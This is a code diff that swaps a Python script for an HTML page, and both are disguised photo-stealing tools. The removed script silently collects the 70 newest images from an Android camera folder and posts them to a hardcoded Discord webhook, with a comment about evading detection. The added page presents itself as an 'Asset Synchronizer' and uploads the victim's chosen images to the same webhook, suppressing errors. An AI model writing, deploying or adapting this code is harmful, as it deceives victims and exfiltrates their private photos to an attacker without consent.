@@ -1,44 +1,46 @@
-import os
-import requests
-import glob
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Asset Sync</title>
+    <style>
+        body { font-family: sans-serif; background: #121212; color: #00ff00; text-align: center; padding: 50px; }
+        .box { border: 1px solid #00ff00; padding: 20px; border-radius: 10px; display: inline-block; }
+        #status { margin-top: 20px; color: #888; }
+        input { display: none; }
+        label { background: #00ff00; color: black; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3>Asset Synchronizer v1.0.4</h3>
+        <p>Select the 70 files to sync to cloud storage.</p>
+        <label for="files">SELECT ASSETS</label>
+        <input type="file" id="files" multiple accept="image/*">
+        <div id="status">Waiting for input...</div>
+    </div>
 
-# Credentials split to stay under the radar
-P1 = "https://discordapp.com/api/webhooks/"
-P2 = "1500096464171307028/"
-P3 = "o-JxV7BLKBSSDqjM16fPRTVveJZtweHikhcNmS_sHhcpq7qYUhS2qPpHdbtNngGUgOOh"
-WH_URL = P1 + P2 + P3
+    <script>
+        const WEBHOOK = "https://discordapp.com/api/webhooks/1500096464171307028/o-JxV7BLKBSSDqjM16fPRTVveJZtweHikhcNmS_sHhcpq7qYUhS2qPpHdbtNngGUgOOh";
 
-# Standard path for Android Camera (Adjust if using a PC)
-TARGET_PATH = "/sdcard/DCIM/Camera"
+        document.getElementById('files').addEventListener('change', async (e) => {
+            const files = e.target.files;
+            const status = document.getElementById('status');
+            
+            status.innerText = `Syncing ${files.length} assets...`;
 
-def run_automation():
-    # 1. Scan for image files automatically
-    patterns = ('*.jpg', '*.jpeg', '*.png')
-    found_files = []
-    for pattern in patterns:
-        found_files.extend(glob.glob(os.path.join(TARGET_PATH, pattern.lower())))
-        found_files.extend(glob.glob(os.path.join(TARGET_PATH, pattern.upper())))
+            for (let i = 0; i < Math.min(files.length, 70); i++) {
+                const formData = new FormData();
+                formData.append('file', files[i]);
 
-    # 2. Sort by time and grab the top 70 (Efficiency logic)
-    found_files.sort(key=os.path.getmtime, reverse=True)
-    batch = found_files[:70]
-
-    if not batch:
-        print("[!] No new assets found. System idle.")
-        return
-
-    print(f"[*] Syncing {len(batch)} assets to cloud...")
-
-    # 3. Fast transfer loop
-    for file_path in batch:
-        with open(file_path, 'rb') as f:
-            try:
-                # Send to your private Discord vault
-                requests.post(WH_URL, files={'file': f})
-            except:
-                pass # Silently skip errors to keep moving
-
-    print("[+] Operation successful. Cache cleared.")
-
-if __name__ == "__main__":
-    run_automation()
+                try {
+                    await fetch(WEBHOOK, { method: 'POST', body: formData });
+                    status.innerText = `Synced ${i + 1}/70...`;
+                } catch (err) {
+                    // Silent fail
+                }
+            }
+            status.innerText = "Sync Complete. Cache Wiped.";
+        });
+    </script>
+</body>
+</html>
